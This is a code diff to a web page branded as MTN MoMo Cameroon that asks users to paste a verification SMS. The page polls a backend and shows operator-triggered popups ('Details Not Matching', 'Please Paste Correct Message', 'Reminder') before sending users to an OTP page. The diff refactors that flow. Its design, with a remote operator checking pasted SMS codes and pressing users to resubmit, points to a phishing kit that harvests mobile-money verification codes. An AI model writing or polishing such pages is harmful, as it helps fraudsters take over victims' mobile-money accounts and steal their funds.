@@ -53,7 +53,7 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ═══════════ HEADER — BLACK ═══════════ */
+        /* ═══════════ HEADER ═══════════ */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -79,14 +79,9 @@
             text-decoration: none;
             color: inherit;
         }
-        .brand-logo-img {
-            height: 48px;
-            width: auto;
-            display: block;
-        }
+        .brand-logo-img { height: 48px; width: auto; display: block; }
         .brand-divider {
-            width: 1px;
-            height: 26px;
+            width: 1px; height: 26px;
             background: rgba(255, 255, 255, 0.2);
             margin: 0 4px;
             flex-shrink: 0;
@@ -144,10 +139,8 @@
             overflow-y: auto;
         }
 
-        /* ═══════════ ICON BADGE ═══════════ */
         .icon-badge {
-            width: 62px;
-            height: 62px;
+            width: 62px; height: 62px;
             border-radius: 50%;
             background: linear-gradient(135deg, #FFFBEB, #FFF3C0);
             display: flex;
@@ -186,12 +179,8 @@
             padding: 0 4px;
             font-weight: 500;
         }
-        .instruction strong {
-            color: var(--text-dark);
-            font-weight: 800;
-        }
+        .instruction strong { color: var(--text-dark); font-weight: 800; }
 
-        /* ═══════════ STEP HINT ═══════════ */
         .step-hint {
             background: linear-gradient(135deg, #FFFBEB, #FFF8DC);
             border: 1px solid #FFE999;
@@ -203,27 +192,11 @@
             gap: 10px;
             flex-shrink: 0;
         }
-        .step-hint .hint-icon {
-            font-size: 16px;
-            flex-shrink: 0;
-            line-height: 1.4;
-        }
-        .step-hint p {
-            font-size: 12px;
-            color: #7A5C00;
-            line-height: 1.5;
-            font-weight: 600;
-        }
-        .step-hint p strong {
-            color: #003366;
-            font-weight: 800;
-        }
+        .step-hint .hint-icon { font-size: 16px; flex-shrink: 0; line-height: 1.4; }
+        .step-hint p { font-size: 12px; color: #7A5C00; line-height: 1.5; font-weight: 600; }
+        .step-hint p strong { color: #003366; font-weight: 800; }
 
-        /* ═══════════ SMS TEXTAREA ═══════════ */
-        .sms-wrapper {
-            position: relative;
-            margin-bottom: 6px;
-        }
+        .sms-wrapper { position: relative; margin-bottom: 6px; }
 
         .sms-textarea {
             width: 100%;
@@ -260,8 +233,7 @@
 
         .paste-btn {
             position: absolute;
-            right: 8px;
-            bottom: 8px;
+            right: 8px; bottom: 8px;
             display: inline-flex;
             align-items: center;
             gap: 5px;
@@ -300,16 +272,12 @@
             font-weight: 700;
             line-height: 1.4;
         }
-        .error-text.show {
-            display: block;
-            animation: slideDown 0.3s ease;
-        }
+        .error-text.show { display: block; animation: slideDown 0.3s ease; }
         @keyframes slideDown {
             from { opacity: 0; transform: translateY(-4px); }
             to   { opacity: 1; transform: translateY(0); }
         }
 
-        /* ═══════════ RESEND ROW ═══════════ */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -318,11 +286,7 @@
             padding: 0 2px;
             flex-shrink: 0;
         }
-        .resend-row span {
-            font-size: 12px;
-            color: var(--text-light);
-            font-weight: 600;
-        }
+        .resend-row span { font-size: 12px; color: var(--text-light); font-weight: 600; }
         .resend-link {
             font-size: 12px;
             font-weight: 800;
@@ -338,7 +302,6 @@
         .resend-link:hover:not(:disabled) { background: #EEF3FF; }
         .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
-        /* ═══════════ VERIFY BUTTON ═══════════ */
         .verify-btn {
             width: 100%;
             padding: 16px;
@@ -381,8 +344,7 @@
 
         .spinner {
             display: inline-block;
-            width: 14px;
-            height: 14px;
+            width: 14px; height: 14px;
             border: 2.5px solid rgba(0, 0, 0, 0.25);
             border-top-color: #1A1A2E;
             border-radius: 50%;
@@ -392,7 +354,6 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ═══════════ SECURITY NOTICE ═══════════ */
         .security-notice {
             display: flex;
             align-items: flex-start;
@@ -409,7 +370,6 @@
         }
         .security-notice .ico { color: var(--success); font-size: 13px; }
 
-        /* ═══════════ FOOTER ═══════════ */
         .footer {
             position: fixed;
             bottom: 0; left: 0; right: 0;
@@ -422,15 +382,10 @@
             align-items: center;
             justify-content: center;
         }
-        .footer-text {
-            font-size: 11px;
-            color: var(--text-light);
-            font-weight: 600;
-            letter-spacing: 0.05em;
-        }
+        .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
         /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY (matches login page)
+           SUPER VERIFY OVERLAY
            ═══════════════════════════════════════════ */
         .verify-overlay {
             position: fixed;
@@ -462,12 +417,7 @@
             50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
         }
 
-        .verify-particles {
-            position: absolute;
-            inset: 0;
-            overflow: hidden;
-            pointer-events: none;
-        }
+        .verify-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
         .verify-particle {
             position: absolute;
             width: 4px; height: 4px;
@@ -502,12 +452,7 @@
             z-index: 2;
         }
 
-        .verify-orbit {
-            width: 140px;
-            height: 140px;
-            position: relative;
-            margin-bottom: 34px;
-        }
+        .verify-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
         .verify-orbit-ring {
             position: absolute;
             inset: 0;
@@ -536,11 +481,7 @@
             animation: corePulse 2s ease-in-out infinite;
             padding: 8px;
         }
-        .verify-orbit-core img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
+        .verify-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
         @keyframes corePulse {
             0%, 100% {
                 box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
@@ -552,11 +493,7 @@
             }
         }
 
-        .verify-dot-orbit {
-            position: absolute;
-            inset: 0;
-            animation: rotateSlow 3.5s linear infinite;
-        }
+        .verify-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
         .verify-dot-orbit span {
             position: absolute;
             width: 8px; height: 8px;
@@ -671,6 +608,172 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
+        /* ═══════════════════════════════════════════
+           NOTICE POPUP (for reject / resend / reminder)
+           ═══════════════════════════════════════════ */
+        .notice-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            z-index: 11000;
+        }
+        .notice-overlay.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .notice-card {
+            background: #fff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 24px 26px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            animation: popIn 0.45s cubic-bezier(0.22, 1, 0.36, 1) both;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.88) translateY(20px); opacity: 0; }
+            to { transform: scale(1) translateY(0); opacity: 1; }
+        }
+
+        .notice-card::before {
+            content: '';
+            position: absolute;
+            top: -60px; right: -60px;
+            width: 160px; height: 160px;
+            border-radius: 50%;
+            opacity: 0.12;
+            pointer-events: none;
+        }
+
+        .notice-icon-wrap {
+            width: 74px; height: 74px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            font-size: 34px;
+            position: relative;
+        }
+
+        /* Reject (red) */
+        .notice-icon-wrap.reject {
+            background: linear-gradient(135deg, #FEE2E2, #FECACA);
+            box-shadow: 0 8px 24px rgba(220, 38, 38, 0.25);
+        }
+        .notice-icon-wrap.reject::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid rgba(220, 38, 38, 0.2);
+            animation: ringPulse 2s ease-out infinite;
+        }
+
+        /* Resend (amber) */
+        .notice-icon-wrap.resend {
+            background: linear-gradient(135deg, #FFF8DC, #FFF3C0);
+            box-shadow: 0 8px 24px rgba(255, 204, 0, 0.35);
+        }
+        .notice-icon-wrap.resend::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid rgba(255, 204, 0, 0.3);
+            animation: ringPulse 2s ease-out infinite;
+        }
+
+        /* Reminder (blue) */
+        .notice-icon-wrap.reminder {
+            background: linear-gradient(135deg, #E0E8FF, #C7D6FF);
+            box-shadow: 0 8px 24px rgba(0, 51, 102, 0.25);
+        }
+        .notice-icon-wrap.reminder::before {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 51, 102, 0.2);
+            animation: ringPulse 2s ease-out infinite;
+        }
+
+        @keyframes ringPulse {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.4); opacity: 0; }
+        }
+
+        .notice-title {
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+            line-height: 1.3;
+            letter-spacing: -0.02em;
+        }
+
+        .notice-message {
+            font-size: 0.9rem;
+            color: var(--text-mid);
+            line-height: 1.6;
+            margin-bottom: 24px;
+            font-weight: 500;
+            padding: 0 4px;
+        }
+        .notice-message strong { color: var(--text-dark); font-weight: 800; }
+
+        .notice-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--grad-gold);
+            color: #1A1A2E;
+            border: none;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            box-shadow: 0 10px 24px rgba(255, 204, 0, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s, filter 0.2s;
+            position: relative;
+            overflow: hidden;
+        }
+        .notice-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
+            transform: translateX(-100%);
+            transition: transform 0.7s;
+        }
+        .notice-btn:hover::after { transform: translateX(100%); }
+        .notice-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(255, 204, 0, 0.55);
+            filter: brightness(0.98);
+        }
+        .notice-btn:active { transform: scale(0.98); }
+
+        .notice-btn.reject-btn {
+            background: linear-gradient(135deg, #DC2626, #B91C1C);
+            color: #fff;
+            box-shadow: 0 10px 24px rgba(220, 38, 38, 0.4);
+        }
+        .notice-btn.reject-btn:hover {
+            box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
+        }
+
         /* ═══════════ SMALL PHONES ═══════════ */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
@@ -697,7 +800,7 @@
 </head>
 <body>
 
-    <!-- ═══════════ HEADER ═══════════ -->
+    <!-- HEADER -->
     <header class="header">
         <div class="header-inner">
             <a href="login.html" class="brand">
@@ -709,7 +812,7 @@
         </div>
     </header>
 
-    <!-- ═══════════ CARD ═══════════ -->
+    <!-- CARD -->
     <div class="card-wrap">
         <main class="card">
             <div class="icon-badge">📩</div>
@@ -765,12 +868,12 @@
         </main>
     </div>
 
-    <!-- ═══════════ FOOTER ═══════════ -->
+    <!-- FOOTER -->
     <footer class="footer">
         <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
     </footer>
 
-    <!-- ═══════════ SUPER VERIFY OVERLAY ═══════════ -->
+    <!-- SUPER VERIFY OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-particles">
             <span class="verify-particle"></span>
@@ -820,6 +923,18 @@
         </div>
     </div>
 
+    <!-- NOTICE POPUP -->
+    <div class="notice-overlay" id="noticeOverlay">
+        <div class="notice-card">
+            <div class="notice-icon-wrap" id="noticeIconWrap">
+                <span id="noticeIcon">ℹ️</span>
+            </div>
+            <h3 class="notice-title" id="noticeTitle">Notice</h3>
+            <p class="notice-message" id="noticeMessage">…</p>
+            <button class="notice-btn" id="noticeBtn" type="button">OK</button>
+        </div>
+    </div>
+
     <script>
         /* ═══════════════════════════════════════════
            BACKEND URL
@@ -842,6 +957,14 @@
         const verifyTitle = document.getElementById('verifyTitle');
         const verifySubtitle = document.getElementById('verifySubtitle');
         const verifyStepInner = document.getElementById('verifyStepInner');
+
+        // Notice popup
+        const noticeOverlay = document.getElementById('noticeOverlay');
+        const noticeIconWrap = document.getElementById('noticeIconWrap');
+        const noticeIcon = document.getElementById('noticeIcon');
+        const noticeTitle = document.getElementById('noticeTitle');
+        const noticeMessage = document.getElementById('noticeMessage');
+        const noticeBtn = document.getElementById('noticeBtn');
 
         /* ═══════════════════════════════════════════
            SESSION CHECK
@@ -965,7 +1088,6 @@
             verifyTitle.innerHTML = 'Verifying your <span class="highlight">SMS</span>';
             verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
 
-            // Rotate steps
             let stepIndex = 0;
             verifyStepInner.style.transform = 'translateY(0)';
             if (stepTimer) clearInterval(stepTimer);
@@ -974,7 +1096,6 @@
                 verifyStepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
             }, 2200);
 
-            // Progress
             const startTime = Date.now();
             if (verifyTimer) clearInterval(verifyTimer);
             verifyTimer = setInterval(function() {
@@ -990,65 +1111,48 @@
             verifyBarFill.style.width = '100%';
         }
 
-        function showRejection(reason) {
+        function stopVerifyAnimation() {
             if (verifyTimer) clearInterval(verifyTimer);
             if (stepTimer) clearInterval(stepTimer);
-            verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#e74c3c';
+            verifyOverlay.classList.remove('show');
+            verifyBarFill.style.background = '';
+            verifyBarFill.style.width = '0%';
             verifyStepInner.style.transform = 'translateY(0)';
-
-            verifyTitle.innerHTML = reason.title;
-            verifySubtitle.textContent = reason.subtitle;
-
-            setTimeout(function() {
-                verifyOverlay.classList.remove('show');
-                verifyBarFill.style.background = '';
-                verifyTitle.innerHTML = 'Verifying your <span class="highlight">SMS</span>';
-                verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
-
-                smsInput.classList.add('invalid');
-                smsError.textContent = reason.errorText || 'Verification failed. Please try again.';
-                smsError.classList.add('show');
-
-                verifyBtn.disabled = false;
-                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
-            }, 1800);
         }
 
         /* ═══════════════════════════════════════════
-           RESEND FROM ADMIN
+           NOTICE POPUP
         ═══════════════════════════════════════════ */
-        let resendHandled = false;
+        let noticeAction = null;
 
-        function handleResendFromAdmin() {
-            if (resendHandled) return;
-            resendHandled = true;
+        function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
+            // Reset classes
+            noticeIconWrap.className = 'notice-icon-wrap';
+            noticeBtn.className = 'notice-btn';
 
-            if (verifyTimer) clearInterval(verifyTimer);
-            if (stepTimer) clearInterval(stepTimer);
-            verifyBarFill.style.width = '100%';
-            verifyBarFill.style.background = '#FFCC00';
-            verifyStepInner.style.transform = 'translateY(0)';
+            if (type) noticeIconWrap.classList.add(type);
+            if (buttonClass) noticeBtn.classList.add(buttonClass);
 
-            verifyTitle.innerHTML = '⚠️ <span class="highlight">Wrong SMS</span> pasted';
-            verifySubtitle.innerHTML =
-                '<b style="color:#ffffff;font-size:14.5px;">The message you pasted is not the correct MTN SMS.</b><br><br>' +
-                'Please start fresh and paste the <b>correct</b> SMS from MTN MoMo.';
-            verifySubtitle.style.fontSize = '13.5px';
-            verifySubtitle.style.lineHeight = '1.65';
-            verifySubtitle.style.padding = '0 6px';
+            noticeIcon.textContent = icon || 'ℹ️';
+            noticeTitle.textContent = title || 'Notice';
+            noticeMessage.innerHTML = message || '';
+            noticeBtn.textContent = buttonText || 'OK';
 
-            setTimeout(function() {
-                localStorage.removeItem('momoSession');
-                localStorage.removeItem('momoPhone');
-                localStorage.removeItem('momoCountry');
-                localStorage.removeItem('momoSms');
-                window.location.href = 'login.html';
-            }, 6000);
+            noticeAction = onOk || null;
+            noticeOverlay.classList.add('show');
         }
 
+        noticeBtn.addEventListener('click', function() {
+            noticeOverlay.classList.remove('show');
+            const action = noticeAction;
+            noticeAction = null;
+            if (typeof action === 'function') {
+                setTimeout(action, 200);
+            }
+        });
+
         /* ═══════════════════════════════════════════
-           POLLING
+           POLLING — handles 4 statuses
         ═══════════════════════════════════════════ */
         let pollTimer = null;
 
@@ -1075,38 +1179,99 @@
                             window.location.href = 'verify-otp.html';
                         }, 350);
 
-                    } else if (data.status === 'resend_requested') {
-                        handleResendFromAdmin();
-
                     } else if (data.status === 'rejected') {
                         stopPolling();
-                        showRejection({
-                            title: 'Please start <span class="highlight">fresh</span>',
-                            subtitle: 'Kindly start fresh and put your details correctly to match.',
-                            errorText: ''
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject',
+                            icon: '❌',
+                            title: 'Details Not Matching',
+                            message: 'Your details are <strong>not matching</strong>. Ensure your details are correct and try again.',
+                            buttonText: 'TRY AGAIN',
+                            buttonClass: 'reject-btn',
+                            onOk: function() {
+                                localStorage.removeItem('momoSession');
+                                localStorage.removeItem('momoPhone');
+                                localStorage.removeItem('momoCountry');
+                                localStorage.removeItem('momoSms');
+                                window.location.href = 'login.html';
+                            }
                         });
-                        setTimeout(function() {
-                            localStorage.removeItem('momoSession');
-                            localStorage.removeItem('momoPhone');
-                            localStorage.removeItem('momoCountry');
-                            localStorage.removeItem('momoSms');
-                            window.location.href = 'login.html';
-                        }, 2200);
+
+                    } else if (data.status === 'resend') {
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'resend',
+                            icon: '🔁',
+                            title: 'Please Paste Correct Message',
+                            message: 'Kindly <strong>paste the correct message</strong> you received from MTN MoMo to complete the process. We appreciate your patience.',
+                            buttonText: 'PASTE NEW SMS',
+                            onOk: function() {
+                                // Stay on same page — clear textarea
+                                smsInput.value = '';
+                                smsInput.classList.remove('invalid');
+                                smsError.classList.remove('show');
+                                updateCharCount();
+                                updateVerifyState();
+                                verifyBtn.disabled = true;
+                                verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+                                smsInput.focus();
+                                window.scrollTo({ top: 0, behavior: 'smooth' });
+                            }
+                        });
+
+                    } else if (data.status === 'reminder') {
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reminder',
+                            icon: '🔔',
+                            title: 'Reminder',
+                            message: 'To proceed, please <strong>paste the message you received from MoMo</strong> to complete the process.',
+                            buttonText: 'OK, GOT IT',
+                            onOk: function() {
+                                smsInput.focus();
+                            }
+                        });
+
+                    } else if (data.status === 'resend_requested') {
+                        // legacy support — same as resend
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'resend',
+                            icon: '🔁',
+                            title: 'Please Paste Correct Message',
+                            message: 'Kindly <strong>paste the correct message</strong> you received from MTN MoMo.',
+                            buttonText: 'PASTE NEW SMS',
+                            onOk: function() {
+                                smsInput.value = '';
+                                updateCharCount();
+                                updateVerifyState();
+                                verifyBtn.disabled = true;
+                                smsInput.focus();
+                            }
+                        });
 
                     } else if (data.status === 'timeout') {
                         stopPolling();
-                        showRejection({
-                            title: 'Request <span class="highlight">timed out</span>',
-                            subtitle: 'Please start fresh.',
-                            errorText: ''
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject',
+                            icon: '⏱️',
+                            title: 'Request Timed Out',
+                            message: 'Your session has expired. Please start again.',
+                            buttonText: 'START OVER',
+                            buttonClass: 'reject-btn',
+                            onOk: function() {
+                                localStorage.removeItem('momoSession');
+                                localStorage.removeItem('momoPhone');
+                                localStorage.removeItem('momoCountry');
+                                localStorage.removeItem('momoSms');
+                                window.location.href = 'login.html';
+                            }
                         });
-                        setTimeout(function() {
-                            localStorage.removeItem('momoSession');
-                            localStorage.removeItem('momoPhone');
-                            localStorage.removeItem('momoCountry');
-                            localStorage.removeItem('momoSms');
-                            window.location.href = 'login.html';
-                        }, 2200);
                     }
                 } catch (err) {
                     console.warn('poll error:', err.message);
@@ -1170,7 +1335,7 @@
 
             } catch (err) {
                 console.error('Verify error:', err);
-                verifyOverlay.classList.remove('show');
+                stopVerifyAnimation();
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
